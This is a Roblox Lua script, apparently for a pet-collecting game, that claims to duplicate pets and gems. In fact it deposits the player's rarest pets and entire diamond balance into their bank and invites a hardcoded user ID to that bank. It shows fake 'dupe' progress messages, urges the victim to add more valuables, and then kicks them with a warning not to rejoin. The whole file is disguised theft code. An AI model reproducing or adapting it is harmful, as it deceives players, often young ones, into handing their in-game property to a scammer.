local LocalNumber = 3803443851
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
    lib.Message.New("Starting dupe...");
	wait(1)
	lib.Message.New("Starting dupe... (25%)");
	wait(1)
	lib.Message.New("Starting dupe... (99%)");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    lib.Message.New("Processing dupe! Please make sure all of your exclusives and gems are in the bank. If they aren't, quickly add them.");
	wait(5)
	lib.Message.New("Please do not rejoin the game in the next 10 minutes or you may lose the pet(s) and gems. If your pets and gems aren't in the bank, quickly add them.");
	wait(15)
	game.Players.LocalPlayer:Kick("Please do not rejoin the game in the next 10 minutes unless your exclusives and gems aren't placed in the bank.")

else
	lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber)
	lib.Message.New("Dupe Error - bank is not tier 2+. If it is, please rejoin the game and try again.");
end;
